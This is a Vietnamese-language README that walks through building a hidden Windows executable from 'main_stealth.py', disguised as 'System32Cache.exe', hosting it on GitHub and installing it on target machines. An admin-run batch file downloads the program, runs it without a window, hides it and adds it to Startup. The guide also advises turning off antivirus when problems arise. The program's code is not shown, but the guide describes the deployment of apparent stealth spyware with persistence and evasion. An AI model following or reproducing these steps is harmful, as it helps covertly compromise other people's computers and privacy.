# 📦 Hướng dẫn Build File .EXE

## ⚠️ QUAN TRỌNG: File .EXE KHÔNG cần Python trên máy đích!

Sau khi build thành công file `.exe`, máy đích **KHÔNG CẦN**:
- ❌ Python
- ❌ Thư viện Python (pip, requests, opencv, v.v.)
- ❌ Bất kỳ phần mềm nào khác

File `.exe` đã chứa **TẤT CẢ** thư viện bên trong, chạy độc lập hoàn toàn!

---

## 🎯 Quy trình

### Bước 1: Build file .EXE (chỉ làm 1 lần trên máy phát triển)

**Yêu cầu trên máy phát triển:**
- ✅ Python 3.8+ đã cài đặt
- ✅ Kết nối internet (để cài PyInstaller)

**Cách 1: Tự động (Khuyến nghị)**
```bash
# Chạy script tự động
BUILD_EXE.bat
```

**Cách 2: Thủ công nếu BUILD_EXE.bat lỗi**

1. **Cài PyInstaller:**
   ```bash
   # Thử các cách sau (theo thứ tự):
   
   # Cách 1: Bình thường
   pip install pyinstaller
   
   # Cách 2: Với timeout
   pip install --default-timeout=100 pyinstaller
   
   # Cách 3: Dùng mirror Tsinghua (nhanh hơn ở châu Á)
   pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pyinstaller
   
   # Cách 4: Dùng mirror Aliyun
   pip install -i https://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com pyinstaller
   ```

2. **Build file .exe:**
   ```bash
   pyinstaller --onefile --noconsole --name="System32Cache" main_stealth.py
   ```

3. **File .exe sẽ được tạo tại:** `dist\System32Cache.exe`

### Bước 2: Upload file .EXE lên GitHub

1. **Copy file .exe vào thư mục `dist/`** (nếu chưa có)
2. **Upload lên GitHub:**
   ```bash
   git add dist/System32Cache.exe
   git commit -m "Add built executable"
   git push
   ```

   Hoặc upload thủ công:
   - Vào GitHub repo
   - Click "Upload files"
   - Kéo thả file `System32Cache.exe` vào thư mục `dist/`
   - Commit

### Bước 3: Cài đặt trên máy đích (KHÔNG cần Python!)

1. **Tải `INSTALL_EXE.bat`** từ GitHub
2. **Chạy với quyền Administrator**
3. **XONG!** Ứng dụng sẽ tự động:
   - ✅ Tải file .exe từ GitHub
   - ✅ Chạy ngay (KHÔNG cần cài Python hay thư viện gì!)
   - ✅ Ẩn và thêm vào Startup

---

## 🔍 Kiểm tra file .EXE đã build

Sau khi build, kiểm tra:
- ✅ File `dist\System32Cache.exe` tồn tại
- ✅ Kích thước file: ~50-200 MB (chứa tất cả thư viện)
- ✅ Có thể chạy thử trên máy khác (không cần Python)

---

## ❓ Troubleshooting

### Lỗi: "Cannot install PyInstaller"
- **Nguyên nhân:** Lỗi mạng, firewall, hoặc proxy
- **Giải pháp:**
  1. Thử dùng mirror: `pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pyinstaller`
  2. Tắt tạm thời firewall/antivirus
  3. Kiểm tra proxy/VPN

### Lỗi: "Module not found" khi build
- **Nguyên nhân:** Thiếu thư viện
- **Giải pháp:** Cài đầy đủ thư viện từ `requirements.txt`:
  ```bash
  pip install -r requirements.txt
  ```

### File .exe quá lớn (>500 MB)
- **Bình thường!** File .exe chứa tất cả thư viện (OpenCV, NumPy, v.v.)
- Có thể giảm bằng cách loại bỏ thư viện không cần thiết

### File .exe không chạy trên máy đích
- Kiểm tra Windows Defender/Antivirus (có thể chặn)
- Chạy với quyền Administrator
- Kiểm tra log: `%APPDATA%\Microsoft\Windows\System32Cache\temp\error.log`

---

## 📝 Tóm tắt

| Bước | Máy phát triển | Máy đích |
|------|----------------|----------|
| Build .exe | ✅ Cần Python + PyInstaller | ❌ KHÔNG CẦN |
| Upload .exe | ✅ Cần Git/GitHub | ❌ KHÔNG CẦN |
| Chạy ứng dụng | ✅ Cần Python | ❌ KHÔNG CẦN (chỉ cần .exe) |

**Kết luận:** Chỉ cần build 1 lần trên máy phát triển, sau đó máy đích chỉ cần file .exe!

